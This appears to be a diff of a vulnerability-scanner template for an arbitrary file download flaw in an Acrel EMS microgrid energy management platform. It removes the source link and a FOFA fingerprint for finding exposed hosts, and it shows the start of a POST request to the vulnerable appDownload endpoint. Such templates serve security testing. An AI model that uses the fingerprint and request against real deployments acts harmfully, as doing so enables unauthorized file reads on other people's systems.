@@ -3,12 +3,8 @@ info:
   name: 安科瑞EMS企业微电网能效管理平台appDownload存在任意文件下载漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wsxptui46utn8imo'
+  description: ''
   tags: lfi,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: wsxptui46utn8imo
-    fofa: body="/ECEMS/static/css/chunk-vue.dd1d6337.css"
 http:
 - raw:
   - 'POST /SubstationWEBV2/main/appDownload HTTP/1.1
